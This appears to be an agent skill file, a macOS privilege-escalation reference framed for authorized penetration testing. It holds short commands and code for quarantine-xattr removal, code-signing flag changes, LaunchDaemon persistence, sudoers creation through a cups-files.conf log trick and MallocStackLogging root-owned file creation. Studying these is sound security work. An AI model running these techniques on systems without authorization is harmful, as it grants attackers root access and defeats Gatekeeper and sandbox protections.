---
name: macos-fs-tricks
description: Use this skill whenever you need to understand or apply macOS filesystem-based privilege escalation techniques, including POSIX permissions, symbolic/hard links, file descriptor manipulation, quarantine bypasses, code signature bypasses, and arbitrary write exploitation. Make sure to use this skill when investigating macOS security, performing penetration testing, analyzing privilege escalation paths, or working with macOS filesystem security mechanisms.
---

# macOS Filesystem Tricks for Privilege Escalation

This skill provides techniques for understanding and exploiting macOS filesystem security mechanisms for privilege escalation. Use these methods for authorized security assessments and penetration testing only.

## Quick Reference

- **POSIX Permissions**: Understand dangerous permission combinations
- **Symlink/Hard Link Attacks**: Redirect privileged writes
- **File Descriptor Leaks**: Inherit privileged FDs
- **Quarantine Bypasses**: Remove Gatekeeper restrictions
- **Code Signature Bypasses**: Modify signed bundles
- **Arbitrary Writes**: Exploit write vulnerabilities

---

## POSIX Permissions

### Directory Permissions

| Permission | Effect |
|------------|--------|
| **read** | Enumerate directory entries |
| **write** | Delete/write files, delete empty folders |
| **execute** | Traverse directory (access files inside) |

### Dangerous Combinations

An attacker can inject symlinks/hard links to obtain privileged arbitrary write when:

1. One parent directory owner in the path is the user
2. One parent directory owner in the path is a users group with write access
3. A users group has write access to the file

### Folder Root R+X Special Case

If a directory has **only root R+X access**, files inside are inaccessible to others. A vulnerability allowing file movement from this folder to another could be abused to read these files.

---

## Symbolic Link / Hard Link Attacks

### Permissive File/Folder

If a privileged process writes to a file that a lower-privileged user can control or pre-create, the user can point it to another file via symlink/hard link.

### O_NOFOLLOW Flag

- `O_NOFOLLOW`: Won't follow symlink in last path component, but follows rest of path
- `O_NOFOLLOW_ANY`: Correct way to prevent following symlinks in entire path

---

## .fileloc Files

Files with `.fileloc` extension point to other applications/binaries. When opened, the referenced application executes.

**Example .fileloc structure:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>URL</key>
    <string>file:///System/Applications/Calculator.app</string>
    <key>URLPrefix</key>
    <integer>0</integer>
</dict>
</plist>
```

---

## File Descriptor Leaks

### Leak FD (no O_CLOEXEC)

If `open()` doesn't use `O_CLOEXEC`, the file descriptor is inherited by child processes.

**Exploitation pattern:**
1. Make a privileged process open a file with high privileges
2. Use `crontab` with `EDITOR=exploit.py` to get the FD
3. The exploit script inherits the FD to the privileged file

**Example:** CVE-2023-32428 - macOS LPE via MallocStackLogging

---

## Quarantine xattr Bypasses

### Remove Quarantine

```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```

### uchg/uchange/uimmutable Flag

Files with immutable attribute cannot have xattrs added:

```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd
xattr -w com.apple.quarantine "" /tmp/asd
# xattr: [Errno 1] Operation not permitted
```

### devfs Mount

devfs mounts don't support xattrs (CVE-2023-32364):

```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
# xattr: [Errno 1] Operation not permitted
```

### writeextattr ACL

Prevent xattr addition via ACL:

```bash
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
```

### com.apple.acl.text xattr + AppleDouble

AppleDouble format copies files including ACEs. The ACL text in `com.apple.acl.text` xattr is set as ACL in decompressed files.

---

## Bypass Signature Checks

### Platform Binary Checks

Bypass by injecting exploit via dyld using `DYLD_INSERT_LIBRARIES` environment variable on a platform binary like `/bin/ls`.

### CS_REQUIRE_LV and CS_FORCED_LV Flags

Modify own code signing flags:

```c
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS
```

---

## Bypass Code Signatures

Bundles contain `_CodeSignature/CodeResources` with hashes of every file. Files with `omit: true` in the plist aren't checked:

**Common omitted patterns:**
- `^Resources/.*\.lproj/locversion.plist$`
- `^(.*/index.html)?\.DS_Store$`
- `^PkgInfo$`

**Calculate signature hash:**

```bash
openssl dgst -binary -sha1 /path/to/file | openssl base64
```

---

## Mount DMGs

Create custom DMG with custom content:

```bash
# Create volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add content
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach
hdiutil detach /private/tmp/mnt 1>/dev/null
```

---

## Arbitrary Writes

### Periodic Shell Scripts

Overwrite `/etc/periodic/daily/999.local` (triggered daily):

```bash
sudo periodic daily  # Fake execution
```

### LaunchDaemons

Create `/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.sample.Load</string>
        <key>ProgramArguments</key>
        <array>
            <string>/Applications/Scripts/privesc.sh</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
    </dict>
</plist>
```

### Sudoers File

Create file in `/etc/sudoers.d/` granting sudo privileges.

### PATH Files

- `/etc/paths` - Main PATH population (root only)
- `/etc/paths.d/` - Load new folders into PATH

### cups-files.conf

Create `/etc/cups/cups-files.conf`:

```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```

This creates `/etc/sudoers.d/lpe` with 777 permissions. Then write sudoers config and set `LogFilePerm 700`.

### Sandbox Escape

Write Terminal preferences file:

```bash
~/Library/Preferences/com.apple.Terminal.plist
```

Execute command at startup via `open`.

---

## Generate Writable Files as Other Users

Create root-owned writable file:

```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```

---

## POSIX Shared Memory

POSIX shared memory enables fast IPC between processes.

**Key functions:**
- `shm_open()` - Create/open shared memory object
- `ftruncate()` - Set size
- `mmap()` - Map into address space
- `munmap()` - Unmap
- `shm_unlink()` - Remove object

**Producer example:**

```c
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096;

    int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
    ftruncate(shm_fd, SIZE);
    void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    sprintf(ptr, "Hello from Producer!");
    munmap(ptr, SIZE);
    close(shm_fd);
    return 0;
}
```

**Consumer example:**

```c
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096;

    int shm_fd = shm_open(name, O_RDONLY, 0666);
    void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
    printf("Consumer received: %s\n", (char *)ptr);
    munmap(ptr, SIZE);
    close(shm_fd);
    shm_unlink(name);
    return 0;
}
```

---

## macOS Guarded Descriptors

Security feature to restrict file descriptor operations.

**Key functions:**
- `guarded_open_np()` - Open FD with guard
- `guarded_close_np()` - Close guarded FD
- `change_fdguard_np()` - Change guard flags

Prevents unauthorized file access and race conditions when FDs are inherited by vulnerable child processes.

---

## Helper Scripts

Use the bundled scripts for common operations:

- `scripts/create-fileloc.sh` - Generate .fileloc files
- `scripts/create-launchdaemon.sh` - Create LaunchDaemon plist
- `scripts/quarantine-bypass.sh` - Remove quarantine xattrs
- `scripts/shared-memory-example.sh` - Compile and run shared memory examples

---

## References

- [Exploiting Directory Permissions on macOS](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
- [CVE-2023-32428 - macOS LPE via MallocStackLogging](https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging)
- [CVE-2023-32364 - macOS Sandbox Escape](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
- [Gatekeeper's Achilles Heel](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
